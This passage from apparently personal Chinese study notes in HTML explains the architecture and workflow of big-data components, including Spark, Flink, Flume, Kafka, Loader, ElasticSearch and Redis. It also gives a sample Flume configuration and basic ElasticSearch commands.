己管理资源调度<br>Spark On Yarn:使用yarn做资源管理调度 <br>Mesos: AMR实验室开发的资源管理器，最适用于Spark的资源管理器</li><li>Spark Core:处理核心</li><li>Spark SQL:处理结构化数据，使用Hive元数据</li><li>Spark Streaming:实时流处理(实际微批处理) , 能够低延迟的计算反馈结果</li><li>MLLib:机器学习,根据历史数据进行建模，根据模型和提供的数据进行数据预测</li><li>GraphX:图计算,主要用于关系统计,关系查询</li><li>SparkR: R语言库,提供R语言接口，可以使用R语言操作Spark</li><li>Structured Streaming:流处理，将数据存入-个无边界表(新数据不断添加，旧数据不断移除)使用增量的方式获取表数据内容进行执行</li></ul><h1 id="Streaming"><a href="#Streaming" class="headerlink" title="Streaming"></a>Streaming</h1><pre><code>分布式流处理组件</code></pre><h2 id="关键特性-实时响应，延迟性低"><a href="#关键特性-实时响应，延迟性低" class="headerlink" title="关键特性:实时响应，延迟性低"></a>关键特性:实时响应，延迟性低</h2><ul><li>数据不存储先执行(离线处理先存储数据然后再执行)</li><li>连续查询(程序运行后就不终止,除非系统故障导致的终止或者手动停止)</li><li>事件驱动:传入的数据信息触动任务处理</li></ul><h2 id="Streaming系统架构"><a href="#Streaming系统架构" class="headerlink" title="Streaming系统架构"></a>Streaming系统架构</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151418540.png?token=ARYCSAXAP6TJ6NCOI5DFBPDCQCNXE"></p><ul><li>Client:客户端接口</li><li>Nimbus (主节点) :接收客户端的请求，管理Supervisor从节点，管理任务分配，编写任务书</li><li>Supervisor (从节点) :实行任务，管理worker</li><li>Worker (进程) :程序执行</li><li>Executor (线程) :每个Executor中默认执行一 一个Task</li><li>Task (任务) : Task分别对应每一 个Spout&#x2F;Bolt组件的执行 </li><li>ZooKeeper:监控Nimbus主节点的状态，如果主节点故障切换备用节点<br>监控Supervisor从节点状态，如果从节点故障,通知Nimbus迁移任务，启动自动恢复<br>接收Nimbus任务书，将每个从节点的任务存放在每个Supervisor自己对应的目录中</li></ul><h2 id="Streaming任务架构"><a href="#Streaming任务架构" class="headerlink" title="Streaming任务架构"></a>Streaming任务架构</h2><ul><li>Topology:拓扑结构,封装任务执行流程</li><li>Spout:发送数据源的组件,接收第三方数据收集I具提供的数据发送到数据流</li><li>每个应用只有一个spout</li><li>Bolt:从数据流中获取数据,执行数据处理，如果当前bolt不是最后-个执行程序将结果放回数据流一个应用中可以有多个bolt</li><li>Tuple:数据流中的数据格式，组件之间数据传输的格式，元组中包含两个参数(id, stream)</li></ul><h2 id="Streaming执行任务"><a href="#Streaming执行任务" class="headerlink" title="Streaming执行任务"></a>Streaming执行任务</h2><ol><li>用户通过Client提交应用到Nimbus中</li><li>Nimbus接收到应用后，根据应用情况及当前集群的从节点情况编写任务书</li><li>将任务书.上传到ZooKeeper中</li><li>ZooKeeper接收到任务书后根据每个节点将对应的任务存放在节点对应的目录下</li><li>Supervisor周期性监测自己在ZooKeeper中的目录有没有新任务</li><li>Supervisor发现新任务，根据任务书内容从Nimbus中下载任务所需要的jar包</li><li>Supervisor执行任务,反馈执行状态给Nimbus .</li><li>Nimbus将任务状态反馈给Client</li></ol><h2 id="根据任务架构执行"><a href="#根据任务架构执行" class="headerlink" title="根据任务架构执行"></a>根据任务架构执行</h2><ol><li>获取拓扑结构</li><li>根据拓扑结构分别找到每一流程的处理单元</li><li>按照路程执行处理单元</li></ol><h2 id="消息传递语义"><a href="#消息传递语义" class="headerlink" title="消息传递语义"></a>消息传递语义</h2><ul><li>最多一次:数据发送只发送一次, 可靠性最低，吞吐量最大<br>  缺点:可能存在数据丢失的情况<br>  优点:数据一定不会被重复执行</li><li>最少一次:数据可能会发送多次，可靠性高，吞吐量较小<br>  优点:数据不会丢失<br>  缺点:数据可能会被重复执行</li><li>仅有一次(精准一次) :数据就发送一-次, 并且保证发送成功，可靠性高，吞吐量最低<br>  优点:数据不会丢失，且数据不被重复处理<br>  缺点:消耗的资源和时间较多</li></ul><h2 id="Ack机制-消息传输最少一次"><a href="#Ack机制-消息传输最少一次" class="headerlink" title="Ack机制(消息传输最少一次)"></a>Ack机制(消息传输最少一次)</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151418753.png?token=ARYCSAWRFRIHBUCJJK33MJLCQCNXY"></p><h1 id="Flink"><a href="#Flink" class="headerlink" title="Flink"></a>Flink</h1><pre><code>分布式实时计算引擎(流处理引擎)</code></pre><h2 id="Flink-VS-Spark-Streaming"><a href="#Flink-VS-Spark-Streaming" class="headerlink" title="Flink VS Spark Streaming"></a>Flink VS Spark Streaming</h2><ul><li>Flink可以做流处理(侧重)也可以做批处理，底层引擎属于流处理引擎</li><li>通过流处理引擎模拟批处理形式实现的批处理</li><li>Spark可以做流处理也可以做批处理(侧重点)，底层弓|擎属于批处理引擎</li><li>通过批处理引擎,模拟流处理实现的流处理功能</li></ul><h2 id="Flink的关键特性"><a href="#Flink的关键特性" class="headerlink" title="Flink的关键特性"></a>Flink的关键特性</h2><pre><code>状态、时间、窗口、检查点</code></pre><h2 id="Flink系统架构"><a href="#Flink系统架构" class="headerlink" title="Flink系统架构"></a>Flink系统架构</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151418648.png?token=ARYCSAX4VBWVPDPE5COHNI3CQCNY4"></p><ul><li>部署形式: Local (单机版部署)<br>  Cluster (Standalone: Flink集群自己管理资源调度<br>  Yarn:借助Yarn组件帮助管理协调资源和任务)<br>  Clound (云部署)</li><li>Flink核心模块: Runtime (不管是流处理还是批处理都是在Runtime中执行)</li><li>接口层: DataStream (流处理)和DataSet (批处理)</li><li>Table API &amp; SQL:处理结构化数据<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Table</span> API:将操作应用封装成方法</span><br><span class="line">    <span class="keyword">select</span>(&quot;t_ demo &quot;).<span class="keyword">where</span>(&quot;条件&quot;)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">SQL</span>:基于<span class="keyword">Table</span> API使用，</span><br><span class="line">    sqlQuery(&quot;select * from t_ demo where条件&quot;)</span><br></pre></td></tr></table></figure></li></ul><h2 id="有界流和无界流"><a href="#有界流和无界流" class="headerlink" title="有界流和无界流"></a>有界流和无界流</h2><ul><li>有界流:知道开始，知道结束，使用批处理处理有界流数据.</li><li>无界流:知道开始，不知道结束，使用流处理接口进行数据处理</li></ul><h2 id="DataStream-用于存储数据的数据集，只能执行流处理操作"><a href="#DataStream-用于存储数据的数据集，只能执行流处理操作" class="headerlink" title="DataStream:用于存储数据的数据集，只能执行流处理操作"></a>DataStream:用于存储数据的数据集，只能执行流处理操作</h2><ul><li>基于流处理运行环境获取到的数据</li></ul><h2 id="DataSet-用来接收数据的数据集，只能执行批处理操作"><a href="#DataSet-用来接收数据的数据集，只能执行批处理操作" class="headerlink" title="DataSet:用来接收数据的数据集，只能执行批处理操作"></a>DataSet:用来接收数据的数据集，只能执行批处理操作</h2><ul><li>基于批处理运行环境获取到的数据</li></ul><p><code>并不能在一个应用中同时接收流处理和批处理接口，以此实现流处理和批处理的共用</code></p><h2 id="Flink运行流程"><a href="#Flink运行流程" class="headerlink" title="Flink运行流程"></a>Flink运行流程</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151419908.png?token=ARYCSARE4QYFZKKQ3RJCOTLCQCN2A"></p><ol><li>DataSource:接收数据输入，从数据源获取数据</li><li>Transformations:数据转换，数据处理过程</li><li>DataSink:将最终数据结果输出到指定位置(如HDFS、 HBase、 文件、数据库等)</li></ol><h2 id="Flink程序运行流程"><a href="#Flink程序运行流程" class="headerlink" title="Flink程序运行流程"></a>Flink程序运行流程</h2><p><code>1. 创建运行环境流处理/批处理</code><br>2. 通过运行环境对象获取数据源数据(DataStream&#x2F;DataSet)<br>3. 针对数据集进行数据转换<br>4. 将最终结果进行输出(批处理的print算子)<br><code>5. 最后执行程序(行动算子) executor()</code></p><h2 id="Flink运行程序"><a href="#Flink运行程序" class="headerlink" title="Flink运行程序"></a>Flink运行程序</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151420112.png?token=ARYCSARQSJHF2WMKPMIWLCTCQCN6E"></p><ol><li>Client向JobManager发起请求</li><li>Client对任务进行优化等操作</li><li>JobManager分配任务给TaskManager</li><li>TaskManager接收到任务后执行任务</li><li>TaskManager反馈任务执行状态给JobManager</li><li>JobManager统一反馈给用户</li></ol><ul><li>Flink Client:用户通过Client连接到JobManager</li><li>JobManager (主节点) :接收用户请求，管理资源任务分配，管理从节点信息</li><li>TaskManager (从节点) :接收任务处理任务，反馈给主节点</li><li>Standalone部署:创建Task Slot: Flink的抽象资源</li></ul><h2 id="Flink状态"><a href="#Flink状态" class="headerlink" title="Flink状态"></a>Flink状态</h2><pre><code>区别于其他组件的一-个特性，支持状态管理(中间结果状态)</code></pre><h2 id="Fink窗口类型"><a href="#Fink窗口类型" class="headerlink" title="Fink窗口类型"></a>Fink窗口类型</h2><ul><li>滑动窗口: 窗口移动方式是平移,设定参数时需要设定窗口大小,滑动距离.窗口大小固定,可能会出现数据源重复和数据丢失的情况</li><li>滚动窗口: 窗口移动方式滚动,滚动距离就是窗口大小,设定窗口时只需要设定窗口大小.窗口大小固定,不会出现数据重复或者数据丢失的情况,会出现空窗口的情况</li><li>会话窗口: 由会话启动的窗口,设定过期时间,窗口代销不固定,运行时不会有丢失的数据,不会出现空窗口</li><li>时间窗口: 以时间为条件设定的窗口,<code>分别可以再分为滑动或滚动</code></li><li>数量窗口: 由会话启动的窗口,设定过期时间,<code>分别可以再分为滑动或滚动</code></li></ul><h2 id="Fink的时间类型"><a href="#Fink的时间类型" class="headerlink" title="Fink的时间类型"></a>Fink的时间类型</h2><ul><li>时间类型: 事件发生的时间 </li><li>时间类型: 时间达到处理系统的时间</li><li>处理时间(默认): 时间被处理的时间</li><li>时间乱序问题: 事件被处理的顺序不是时间产生顺序</li><li>时间乱序原因: 数据受到数据传输影响</li></ul><h2 id="Watermark-水位线-x2F-水印-解决数据乱序问题"><a href="#Watermark-水位线-x2F-水印-解决数据乱序问题" class="headerlink" title="Watermark(水位线&#x2F;水印): 解决数据乱序问题"></a>Watermark(水位线&#x2F;水印): 解决数据乱序问题</h2><ul><li>设定水位线时间,当水位线设定的时间时间也达到系统时,就会触发窗口执行</li><li>可设置水位线延迟,可允许窗口延迟触发\</li></ul><h2 id="对于延迟数据的处理方式"><a href="#对于延迟数据的处理方式" class="headerlink" title="对于延迟数据的处理方式"></a>对于延迟数据的处理方式</h2><ul><li>丢弃(默认): 当窗口已经被触发过,该窗口的数据达到也会被丢弃,不会被执行</li><li>可允许延迟: 设定可允许延迟时间,窗口已经被执行,但是输在可允许延迟时间达到,重新重发窗口的执行<br><code>allowedLateness</code>(可延迟时间)</li><li>收集后做统一处理: 把所有的延迟数据收集起来,在程序最后做统一处理<br><code>OutputTag&lt;T&gt; lateOutputTag = new OutputTag //用于存放延迟数据的数据集</code><br><code>.side0utputLateData(late0utputTag)</code></li></ul><h2 id="Flink容错性-CheckPoint实现"><a href="#Flink容错性-CheckPoint实现" class="headerlink" title="Flink容错性 (CheckPoint实现)"></a>Flink容错性 (CheckPoint实现)</h2><ol><li><code>CheckPoint:检查点，自动触发,当任务结束后会自动删除</code><ul><li>保存当前任务状态，周期性触发,默认情况下不启动检查点</li><li>在启动检查点时就可以设定周期时间，单位ms: .enableCheckPointing(10000)</li><li>修改消息传输语义(默认情况仅有一次): .setCheckPointMode(CheckPointMode.AT_LEAST_ONCE)</li><li>快照超时时间:防止一个问题快照影响大量快照创建堆积: .setCheckpointingTimeout(60000)</li><li>可以设定检查点之间的最小间隔时间</li><li>可以设定最大并行执行数量</li><li>设定外部检查点:可以把检查点信息存储于在外部系统中，不会因为Flink系统问题受到影响</li></ul></li><li>SavePoint:保存点，底层CheckPoint, 手动触发,任务结束后也依旧保留</li></ol><h2 id="状态保存"><a href="#状态保存" class="headerlink" title="状态保存"></a>状态保存</h2><p>内存:默认，state和checkpoint都存储在内存，只是用本地测试<br>文件系统: state在内存， checkpoint在文件系统中<br>数据库: state存储在内置数据库中，checkpoint在文件系统中，针对大量数据任务处理的场景</p><h1 id="Flume"><a href="#Flume" class="headerlink" title="Flume"></a>Flume</h1><pre><code>Flume属于一个高性能、分布式的海量日志采集工具可以适用于流数据采集、也可以用于静态数据采集</code></pre><h2 id="Flume基础架构"><a href="#Flume基础架构" class="headerlink" title="Flume基础架构"></a>Flume基础架构</h2><pre><code>(主用应用于单节点数据采集)</code></pre><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151420684.png?token=ARYCSAQ53KMGFJWE4NRDOKDCQCN6Y"></p><ul><li>Flume中有两个组件对外交互: source、 sink</li><li>source:采集数据,接收数据输入</li><li>channel:管道、 临时存储</li><li>sink:数据输出</li></ul><h2 id="Flume多agent架构"><a href="#Flume多agent架构" class="headerlink" title="Flume多agent架构"></a>Flume多agent架构</h2><pre><code>(主要用于集群外采集传递到集群内采集)</code></pre><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151420961.png?token=ARYCSAULGDFE5WKWJBQV4WTCQCN7I"></p><ul><li>把第一级的Flume数据输出到第二级Flume中</li><li>设定第一-级Flume的sink类型为avro协议或者thrift协议可以将数据存储到下一级Flume的Source</li></ul><h2 id="Flume多Agent合并"><a href="#Flume多Agent合并" class="headerlink" title="Flume多Agent合并"></a>Flume多Agent合并</h2><pre><code>(将多数据源采集到的数据汇总处理)</code></pre><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151420077.png?token=ARYCSAXS56IVNM2IIBLZWVDCQCOAC"></p><h2 id="Flume数据传输基本单位"><a href="#Flume数据传输基本单位" class="headerlink" title="Flume数据传输基本单位"></a>Flume数据传输基本单位</h2><ul><li>event: 基本单位,header+ byte[]</li><li>当source采集数据时，在source内部将数据封装成event</li></ul><h2 id="Flume-Agent原理"><a href="#Flume-Agent原理" class="headerlink" title="Flume Agent原理"></a>Flume Agent原理</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151421543.png?token=ARYCSATG3JJOAWTBCBKGDG3CQCOAY"></p><ol><li>在source内部可以将数据封装成event</li><li>source将event传输给channel处理器(拦截器)可以做数据简单处理</li><li>清洗完后的数据通过channe|选择器将event输入到指定的channel</li><li>SinkRunner在程序运行时就启动</li><li>使用sink处理器实例化一个指定类型的sink从指定的channel中抽取数据</li><li>将抽取到的数据按照设定的类型和目的路径将数据输出</li></ol><h2 id="Flume-Source"><a href="#Flume-Source" class="headerlink" title="Flume Source"></a>Flume Source</h2><pre><code>(数据收集、接收数据输入)</code></pre><ul><li>驱动型:被动接收数据输入</li><li>轮询型:周期性的主动扫描是否有新数据产生</li></ul><h2 id="Flume-Channel"><a href="#Flume-Channel" class="headerlink" title="Flume Channel"></a>Flume Channel</h2><pre><code>(数据存储)</code></pre><ul><li><p>MemoryChannel (内存) : event数据存放在当前节点的内存中<br>  读写速度快，数据未持久化，占用内存空间<br>  capacity:最大内存容量(默认情况下使用到节点内存存满为止)</p></li><li><p>FileChannel (文件) :使用WAL,管理上比较复杂<br>数据可持久化，数据读写速度慢于内存形式</p></li><li><p>JDBCChannel (内置数据库) : derby数据库，可以替代File存储的形式<br>数据可持久化，数据读写速度慢于内存形式</p></li></ul><h2 id="Flume-Sink"><a href="#Flume-Sink" class="headerlink" title="Flume Sink"></a>Flume Sink</h2><pre><code>(数据输出)</code></pre><h2 id="Flume的Source、Channel、-Sink之间的关系"><a href="#Flume的Source、Channel、-Sink之间的关系" class="headerlink" title="Flume的Source、Channel、 Sink之间的关系"></a>Flume的Source、Channel、 Sink之间的关系</h2><ul><li><code>一个Source至少连接一个Channel</code></li><li><code>一个Sink只作用于一个Channel</code></li></ul><h2 id="Flume级联节点"><a href="#Flume级联节点" class="headerlink" title="Flume级联节点"></a>Flume级联节点</h2><pre><code>级联节点间传输的数据可以进行加密、压缩</code></pre><ul><li>加密:提高数据传输安全性</li><li>压缩:提高整体传输速度(减少传输时间)</li><li><code>Flume内部数据传输(source --&gt; channel --&gt; sink) 不需要加密</code></li></ul><h2 id="Flume运行实例"><a href="#Flume运行实例" class="headerlink" title="Flume运行实例"></a>Flume运行实例</h2><pre><code>内容需要配置到配置文件中(自定义.properties)</code></pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a.sources= r1</span><br><span class="line">a.channels=c1</span><br><span class="line">a.sinks=k1</span><br><span class="line">a.sourses.r1.type=taildir</span><br><span class="line">a.sourses.r1.postion= 记录pos记录的文件</span><br><span class="line">a.sourses.r1.filegroups=f1 f2</span><br><span class="line">a.sourses.r1.filegroups.f1 = 要监控的文件</span><br><span class="line">a.sourses.r1.filegroups.f2= 要监控的文件</span><br><span class="line">a.channels.c1.type=memory</span><br><span class="line">a.sinks.k1.type=logger</span><br><span class="line">a.sources.r1.channels=c1</span><br><span class="line">a.sinks.k1.channel=c1</span><br></pre></td></tr></table></figure><h2 id="Flume运行命令"><a href="#Flume运行命令" class="headerlink" title="Flume运行命令"></a>Flume运行命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flume-ng agent --name a --conf flumecï 71411Z --conf-file 配置文件 - Dflume.root.logger=info, console</span><br><span class="line">flume-ng agent -n a -C flume配置文件路径 -f 配置文件 -Dflume.root.logger=info, console</span><br></pre></td></tr></table></figure><h1 id="Kafka"><a href="#Kafka" class="headerlink" title="Kafka"></a>Kafka</h1><pre><code>分布式日志系统(发布订阅消息系统)，可分区、多副本、多订阅</code></pre><h2 id="消息传输形式"><a href="#消息传输形式" class="headerlink" title="消息传输形式"></a>消息传输形式</h2><ul><li>点对点:数据在被获取到之后就会被从消息系统中删除(只有-一个用户可以获取到这个消息)</li><li>发布订阅:消息发布之后，就算被用户获取之后也不会删除，依旧保留在系统中提供给其他用户获取</li></ul><h2 id="Kafka的特点"><a href="#Kafka的特点" class="headerlink" title="Kafka的特点"></a>Kafka的特点</h2><ul><li>可支持TB级别的数据也能在常量时间内的访问性能</li><li>高吞吐率:单节点每秒可以传输100K条数据</li><li>可分区:数据以分区形式存储</li><li>多副本:提高数据容错性</li><li>同时支持流处理和批处理</li><li>可扩展性:本身属于集群由多节点组成，扩展节点</li></ul><h2 id="Kafka拓扑结构"><a href="#Kafka拓扑结构" class="headerlink" title="Kafka拓扑结构"></a>Kafka拓扑结构</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151421126.png?token=ARYCSAWNQND46BLECQTNASDCQCOBU"></p><ul><li>Kafka:由broker集群组成</li><li>Producer:数据发布者，发布消息，将数据发布到Kafka中存储</li><li>Consumer:数据消费者，订阅消息，从Kafka中获取数据</li><li>ZooKeeper: Kafka强依赖，监测集群状态</li></ul><h2 id="Kafka集群系统架构"><a href="#Kafka集群系统架构" class="headerlink" title="Kafka集群系统架构"></a>Kafka集群系统架构</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151422239.png?token=ARYCSATAJWDNKTIBO7OTGSLCQCOFA"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151422226.png?token=ARYCSASRM7AGQUEACQZWSCDCQCOFS"></p><h2 id="消费组-consumer-group"><a href="#消费组-consumer-group" class="headerlink" title="消费组:consumer group"></a>消费组:consumer group</h2><pre><code>每个消费者一定是属于某一个消费组</code></pre><ul><li>消费数据规则:消费组内的数据是竞争的,消费组间的数据是共享的 <br>一条消息可以被多个消费组获取,但是每个消费组只能有一个消费者消费信息</li><li>Kafka Topic:消息类别名<br>用于区分记录数据、发布者发布数据时需要指定topic,消费者订阅数据时指定topic</li><li>Kafka Partition:分区，数据写入:顺序追加的方式<br>数据以分区的形式存储，在创建topic时可以指定当前topic中有几个分区</li><li>Kafka Segment:分段<br>每个消息就是一个分段, 分段由两个文件组成.index和.log</li><li>Offset:偏移量值<br>每一个消息都有的唯一标识位置</li><li>每个消费组都会维护一份offset文件(当前组中的成员读取的数据位置)</li><li>读取数据时数据定位: broker –&gt; topic –&gt; offset</li></ul><h2 id="Kafka的其他重要概念"><a href="#Kafka的其他重要概念" class="headerlink" title="Kafka的其他重要概念"></a>Kafka的其他重要概念</h2><ul><li>replica:副本，在创建partition的时候指定该分区有几个副本\</li></ul><p>–partitons 1 –replaction-factor 2<br>数据文件为2份，partiton本身也属于副本的一部分</p><ul><li>leader:从副本中选取一个leader对外提供服务，发布者和消息者只跟leader交互</li><li>follower:除leader以外的其他副本都是follower, follower同步leader信息</li><li>controller: kafka中的一 -个服务器: leader选举、 leader切换</li><li>ISR列表:列表中的follower,能正常同步leader信息<br>只有在列表中的follower有资格成为下一-任leader<br>刚开始所有的follower都在ISR列表中，当follower故障不能及 时同步leader时会被移除列表</li></ul><h2 id="Kafka分区副本"><a href="#Kafka分区副本" class="headerlink" title="Kafka分区副本"></a>Kafka分区副本</h2><pre><code>(节点和节点之间的分区互为主备)</code></pre><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151422335.png?token=ARYCSAWMSBMNJRP2FG4WMY3CQCOGE"></p><p>分区副本同步</p><pre><code>(follower从leader同步数据 )</code></pre><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151422218.png?token=ARYCSAXBVFDRGL4Q2FLNJC3CQCOG2"></p><ul><li>如果所有分区都出现故障<br>可靠性高、恢复速度慢:等待ISR中的分区恢复，第一个恢复就是leader<br>可靠性低、恢复速度快:等待分区恢复，第一个恢复的不管是不是ISR列表中的分区也成为leader</li><li>可靠性传输:幂等性(操作一次和多次的结果是一样)<br>给每条消息一个唯-标识id, 消息传递后使用一个列表记录已传输成功的消息id<br>每条消息传输到达时都会被使用id在列表中查询，查看id是否存在<br>如果存在:说明消息之前已经被传输过<br>如果不存在:正常处理，并且处理完后将id写入列表</li><li>acks机制(检测数据是否发送成功)<br>acks&#x3D;0:不管数据是否发送成功<br>acks&#x3D;1:当数据写入leader时就认为成功<br>acks&#x3D;all:当数据写入leader并且follower都接收到才反馈成功</li><li>Kafka持久化存储数据(不管数据有没有被消费过)</li><li>旧数据的处理方式:删除&#x2F;压缩<br>删除:配置数据过期时间<br>压缩:根据键值对的key值只保留最新的value值，以前的值就删除</li><li>Kafka高吞吐的原因<br>顺序读写:数据以追加形式写入分区，速度远快于随机读写<br>零拷贝:数据写入不需要经过数据缓冲区直接到达磁盘<br>分区:数据可以分别存在多个分区中，读取的时候可以并行的从分区中读取到数据<br>压缩:可以对数据进行压缩</li></ul><p><code>分区副本:只有leader对外提供服务的, follower只做同步操作</code></p><h1 id="Loader"><a href="#Loader" class="headerlink" title="Loader"></a>Loader</h1><pre><code>基于开源的Sqoop组件开发得到的</code></pre><h2 id="Loader-1"><a href="#Loader-1" class="headerlink" title="Loader"></a>Loader</h2><ul><li>Loader数据导入导出(作用在关系型数据库和非关系型数据库之间)<br>关系型数据库:结构化<br>非关系型数据库:非结构化</li><li>数据导入:数据从RDB导入到NoSQL</li><li>数据导出:数据从NoSQL导出到RDB</li><li>Loader相比较Sqoop组件的增强特性<br>图形化:提供WebUI界面可以通过界面配置任务,连接器的配置<code>MRS (Hue)</code><br>高性能:底层使用MapReduce并行处理<br>高可靠:主备双机的搭建<br>  作业失败后允许重试<br>  作业失败后不会有残留的数据<br>安全性:使用kerberos进行安全认证</li></ul><h2 id="Loader模型架构"><a href="#Loader模型架构" class="headerlink" title="Loader模型架构"></a>Loader模型架构</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151422011.png?token=ARYCSAS7ZWGY6RPEGOYEUMTCQCOHI"></p><ol><li><p>Loader Client: Tool: 命令行模式连接Loader服务</p><ul><li>Web UI: MRS图形化的方式连接到Loader</li></ul></li><li><p>Loader Server:</p><ul><li>Restful API (http+json) 对外提供的连接接口</li><li>JobSheduler: Transform 转换模块–&gt;数据处理.<br> Execution执行模块–&gt;执行计划<br> Submission提交模块–&gt;提交到MR<br> JobManager:管理任务执行状态</li><li>Metadata Repository:元数据仓库，存储管理元数据</li><li>HA Manager:主备管理</li></ul></li></ol><h2 id="Loader任务执行"><a href="#Loader任务执行" class="headerlink" title="Loader任务执行"></a>Loader任务执行</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151422876.png?token=ARYCSASCAA6THGM7VECBPZDCQCOH2"></p><ol><li>Client提交任务</li><li>Loader任务计划</li><li>将任务提交给Yarn</li><li>Yarn调配资源将任务分配为Map或Reduce任务执行</li><li>将数据存入设定的存储介质中</li></ol><h2 id="Loader任务配置"><a href="#Loader任务配置" class="headerlink" title="Loader任务配置"></a>Loader任务配置</h2><ul><li>输入:数据来源的配置</li><li>转换:字段映射、获取数据、过滤数据、并发执行数量</li><li>输出:数据最终输出目的地的配置</li></ul><h1 id="ElasticSearch"><a href="#ElasticSearch" class="headerlink" title="ElasticSearch"></a>ElasticSearch</h1><pre><code>分布式检索服务,适用实时场景Hive:可以做查询分析，底层MR处理，不适用实时</code></pre><h2 id="ElasticSearch特点"><a href="#ElasticSearch特点" class="headerlink" title="ElasticSearch特点"></a>ElasticSearch特点</h2><ul><li>基于Lucena扩展</li><li>可以水平扩展</li><li>原型环境和生产环境可以无缝切换</li><li><code>作为非关系型数据库NoSQL数据库使用</code></li><li>支持结构化数据和非结构化数据</li></ul><h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><ol><li><p>正排索引:在文件中查找关键字 <br> 扫描每个文件内容找到跟关键字相关的文件，返回文件 </p></li><li><p>倒排索引:根据关键字查找文件(提前给文件设定关键字)<br>根据关键字查哪些文件标记了这个关键字<br>快速查找相关文件，并且文件相关度更高</p></li></ol><h2 id="ElasticSearch系统架构"><a href="#ElasticSearch系统架构" class="headerlink" title="ElasticSearch系统架构"></a>ElasticSearch系统架构</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151423023.png?token=ARYCSAUFEFGFKRZGMEMZQSTCQCOI6"></p><ul><li>Client:连接到ZooKeeper获取集群信息，连接到集群</li><li>EsMaster:主要任务分配，管理EsNode信息， 不参与分片级别的数据检索</li><li>EsNode:处理用户管理索引|操作，管理自身分片信息(数据默认存储在内存中)</li><li>ZooKeeper: es强依赖，管理集群状态，并且记录集群信息</li></ul><h2 id="ElasticSearch中的核心概念"><a href="#ElasticSearch中的核心概念" class="headerlink" title="ElasticSearch中的核心概念"></a>ElasticSearch中的核心概念</h2><ul><li>索引: index –&gt; 命名空间</li><li>文档: document –&gt; 数据存储，ES中的检索基本单元</li><li>映射: mapping –&gt; 约束字段类型</li></ul><h2 id="ElasticSearch命令使用"><a href="#ElasticSearch命令使用" class="headerlink" title="ElasticSearch命令使用"></a>ElasticSearch命令使用</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">数据添加/修改: put /索引/_doc/id</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;key&quot;</span>:<span class="string">&quot;value&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">数据查询: get /索引/_doc/id</span><br><span class="line">数据删除: delete /索引/_doc/id</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h1><pre><code>基于内存的，网络高性能数据库</code></pre><ul><li>读取速度快，低延迟</li><li>适用于实时场景</li><li>可持久化(RDB&#x2F;AOF)</li><li>key-value<br>key命名:见名知意<br>value:可以存储多样数据</li><li>属于NoSQL数据库(存储多样化:图像、视频、音频、数字、文字等)</li></ul><h2 id="Redis应用场景"><a href="#Redis应用场景" class="headerlink" title="Redis应用场景"></a>Redis应用场景</h2><ul><li>排序类应用</li><li>设置过期时间应用</li><li>统计计数</li><li>消息队列</li><li>临时存储</li></ul><h2 id="Redis系统架构"><a href="#Redis系统架构" class="headerlink" title="Redis系统架构"></a>Redis系统架构</h2><ul><li><code>无中心、自组织的集群</code>: 集群中的所有节点会维护一个集群拓扑</li><li>分桶:根据key值计算hash存储进不同的槽中</li><li>集群拓扑中维护的就是槽和节点的映射关系</li><li><code>Redis节点只帮助用户重定向，不进行转发</code><br>重定向: Client发出多次请求(<code>Client分 别请求节点</code>)<br>转发: Client只需要请求第一个节点，节点帮助Client向正确的节点发出请求(Client只需要请求第一 台节点)</li></ul><h2 id="Redis读写流程"><a href="#Redis读写流程" class="headerlink" title="Redis读写流程"></a>Redis读写流程</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151423308.png?token=ARYCSASCGAE5V24SDVWYL7DCQCOJ6"></p><ol><li>Client向任意一 个节点发出请求，连接到redis</li><li>从redis节点中获取redis集群拓扑，得到key存储的server信息</li><li>可以获取到key对应的槽所在的server信息</li><li>如果做读取，对server发起读请求，如果是写入，就发起写请求</li><li><code>如果在Client获取拓扑时，数据发生变动，从一个节点迁移到另-一个节点</code></li><li>此时Client获取到的是旧的拓扑，向原定的server发起请求</li><li>server接收到请求后发现Client要请求的数据已经被迁移,会告诉Client数据被迁移到哪个节点</li><li>Client从原server中接收到正确server的反馈信息</li><li>对新server重新发起一-次请求，获取数据响应</li></ol><h2 id="Redis关键特性"><a href="#Redis关键特性" class="headerlink" 